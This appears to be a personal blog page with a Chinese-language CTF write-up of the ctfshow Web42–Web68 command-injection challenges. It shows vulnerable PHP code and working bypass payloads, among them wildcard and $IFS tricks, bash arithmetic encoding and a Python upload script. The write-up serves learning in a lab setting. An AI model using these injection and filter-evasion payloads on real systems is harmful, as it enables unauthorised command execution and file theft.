@@ -1,0 +1,484 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>ctfshow | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>ctfshow</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/11
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h4 id="Web42"><a href="#Web42" class="headerlink" title="Web42"></a>Web42</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;dev&#x2F;null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
+<p>这是本题的核心</p>
+<p>就是因为后面会让所有的输入的全部被弃掉</p>
+<p>所以我们要阻止后面的发生</p>
+<p>所以我们可以使用||</p>
+<p><img src="file:///C:\Users\汪涵裕\AppData\Local\Temp\ksohtml26060\wps2.jpg" alt="img"> </p>
+<p>所以</p>
+<p>ls||</p>
+<p><img src="file:///C:\Users\汪涵裕\AppData\Local\Temp\ksohtml26060\wps3.jpg" alt="img"> </p>
+<p>cat flag.php||即可</p>
+<h4 id="Web43"><a href="#Web43" class="headerlink" title="Web43"></a>Web43</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">   if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>多过滤了一个cat</p>
+<p>使用tac即可</p>
+<h4 id="Web44"><a href="#Web44" class="headerlink" title="Web44"></a>Web44</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>过滤了flag</p>
+<p>通配符绕过即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac ????.???||</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web45"><a href="#Web45" class="headerlink" title="Web45"></a>Web45</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>过滤了空格</p>
+<p>可以考虑$IFS绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09fla*.php||</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web46"><a href="#Web46" class="headerlink" title="Web46"></a>Web46</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>增加过滤了$、*和数字，没什么太大影响</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09????.???||</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web47"><a href="#Web47" class="headerlink" title="Web47"></a>Web47</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了几个读取flag的函数</p>
+<p>直接继续使用上一题的payload即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09????.???||</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web48"><a href="#Web48" class="headerlink" title="Web48"></a>Web48</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>继续过滤了更多的读取函数</p>
+<p>但是还是没有过滤tac，可以继续使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09????.???||</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web49"><a href="#Web49" class="headerlink" title="Web49"></a>Web49</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本题过滤了%</p>
+<p>但是传参之后先进行url编码再进行判定，所以%09依旧可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac%09????.???||</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web50"><a href="#Web50" class="headerlink" title="Web50"></a>Web50</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依旧是没过滤tac</p>
+<p>但是过滤了%09</p>
+<p>所以要尝试换一种方法绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;&gt;????.???||</span><br></pre></td></tr></table></figure>
+
+<p>发现没用？</p>
+<p>原来是&lt;&gt;不能和?一起用，所以换一种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure>
+
+<p>成功！</p>
+<h4 id="Web51"><a href="#Web51" class="headerlink" title="Web51"></a>Web51</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>震惊！！！</p>
+<p>过滤了tac，完蛋，但是没完全完蛋</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl&lt;&gt;fla\g.php||</span><br></pre></td></tr></table></figure>
+
+<p>嘻嘻</p>
+<h4 id="Web52"><a href="#Web52" class="headerlink" title="Web52"></a>Web52</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>？少过滤了一个$ ？</p>
+<p>哦，原来是过滤了&lt;&gt;</p>
+<p>那就可以使用{$IFS}绕过了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;fla\g.php||</span><br></pre></td></tr></table></figure>
+
+<p>不对？</p>
+<p>尝试看看文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=ls$&#123;IFS&#125;/||</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240611152345273.png" alt="image-20240611152345273"></p>
+<p>所以说文件都换了是吧</p>
+<p>好好好</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;/flag||</span><br></pre></td></tr></table></figure>
+
+<p>拿到flag</p>
+<h4 id="Web53"><a href="#Web53" class="headerlink" title="Web53"></a>Web53</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo &quot;&lt;br&gt;&quot;.$d;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;no&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了好多欸，但是跟上一题怎么感觉差不多啊</p>
+<p>对了，它没有null那种东西了，所以我们直接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=nl$&#123;IFS&#125;????.???</span><br></pre></td></tr></table></figure>
+
+<p>拿下！！！</p>
+<h4 id="Web54"><a href="#Web54" class="headerlink" title="Web54"></a>Web54</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤的好啊，好啊</p>
+<p>这个时候就需要看看有没有其它读取文件可以用的函数了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=uniq$&#123;IFS&#125;????.???</span><br><span class="line">?c=grep$&#123;IFS&#125;&#x27;&#123;&#x27;$&#123;IFS&#125;fl???php</span><br><span class="line">（在 fl???php匹配到的文件中，查找含有&#123;的文件，并打印出包含 &#123; 的这一行）</span><br></pre></td></tr></table></figure>
+
+<p>uniq和grep，使用方法如上</p>
+<h4 id="Web55"><a href="#Web55" class="headerlink" title="Web55"></a>Web55</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我没有技，怎么炫…</p>
+<p>过了所有字母和一些符号</p>
+<p>那我咋玩</p>
+<p>所以我们看看大佬的解题</p>
+<p>方法一：</p>
+<p>没有过滤数字，所以想一想查看文件的命令有没有数字开头的</p>
+<p>匹配到&#x2F;bin目录下的命令<br><code>cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等</code><br>发现存在一个<code>base64</code><br>我们就可以通过<code>通配符</code>进行匹配命令执行查看flag.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br><span class="line">意思是 /bin/base64 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<p>bzip2是linux下面的压缩文件的命令 关于bzip2命令的具体介绍<br>&#x2F;usr&#x2F;bin目录:</p>
+<p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等。</p>
+<p>我们可以利用&#x2F;usr&#x2F;bin下的bzip2</p>
+<p>意思就是说我们先将flag.php文件进行压缩，然后再将其下载<br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=/???/???/????2 ????.???</span><br><span class="line">也就是/usr/bin/bzip2 flag.php</span><br></pre></td></tr></table></figure>
+
+<p>方法三：</p>
+<p>无数字webshell脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    url = &quot;https://de0839d3-0ef6-490d-b638-b457f784391f.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br><span class="line">    r = requests.post(url, files=&#123;&quot;file&quot;: (&#x27;feng.txt&#x27;, b&#x27;cat flag.php&#x27;)&#125;)</span><br><span class="line">    if r.text.find(&quot;flag&quot;) &gt; 0:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>又过滤了数字</p>
+<p>天要亡我啊！！</p>
+<p>但是回看上一道题</p>
+<p>这个脚本好像还能用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    url = &quot;https://c38e4ff5-357b-4246-bc23-174b37df5712.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br><span class="line">    r = requests.post(url, files=&#123;&quot;file&quot;: (&#x27;feng.txt&#x27;, b&#x27;cat flag.php&#x27;)&#125;)</span><br><span class="line">    if r.text.find(&quot;flag&quot;) &gt; 0:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>改一个网址就行</p>
+<h4 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 还能炫的动吗？</span><br><span class="line">//flag in 36.php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了字母、数字、分号和两个通配符</p>
+<p>取反</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先看等号左边(100) 的二进制表示为: 0110 0100 按位取反的意思就是每一位取反，0变1，1变0</span><br><span class="line">所以: ~100 的二进制表示为：1001 1011 所以等号左边=1001 1011</span><br><span class="line"></span><br><span class="line">再看右边</span><br><span class="line">-101. 一旦看到出现负数，那么这个数一定是按有符号数的规则来表示的。一个二进制数 按位取反并加一以后就可以得到它自己的负数的补码，也就是说： ~x+1=-x 所以，我们把101按位取反加一 先取反：</span><br><span class="line">~101=10011010 再加一： ~101+1=10011011=-101 所以等号右边=10011011=左边，所以等号成立。</span><br></pre></td></tr></table></figure>
+
+<p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p>
+<p>echo ${_} #返回上一次的执行结果<br>echo $(()) #0<br>echo $((<del>$(()))) #</del>0是-1<br>$(($((<del>$(())))$((</del>$(()))))) #$((-1-1))即$$((-2))是-2<br>echo $((<del>-37)) #</del>-37是36</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($((~$(())))$((~$(())))))==-2</span><br></pre></td></tr></table></figure>
+
+
+<p>拆开看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( $((~$(()))) $((~$(()))) ))</span><br><span class="line">$((~$(())))==-1 中间有两个所以是-2 是相加的 那中间有37个就是-37</span><br></pre></td></tr></table></figure>
+
+<p>然后取反就是36<br>playload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))</span><br></pre></td></tr></table></figure>
+
+<p>好神奇，这个是看大佬的wp写的，所以其实有点看不懂，再看看</p>
+<h4 id="Web58-65"><a href="#Web58-65" class="headerlink" title="Web58-65"></a>Web58-65</h4><p>这些题一模一样</p>
+<p>都是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>两者都是读取文件</p>
+<p>小本本记下来</p>
+<p>后者主要是要猜测目标文件，前者不需要</p>
+<h4 id="Web66"><a href="#Web66" class="headerlink" title="Web66"></a>Web66</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>多过滤了一个show_source</p>
+<p>所以我们尝试一下以下两种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST：c=print_r(scandir(&quot;/&quot;));</span><br><span class="line">POST: c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>同样是两种读取的方式</p>
+<h4 id="Web67"><a href="#Web67" class="headerlink" title="Web67"></a>Web67</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题尝试之后发现print_r不能用了，所以可以尝试一下两种方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19</span><br></pre></td></tr></table></figure>
+
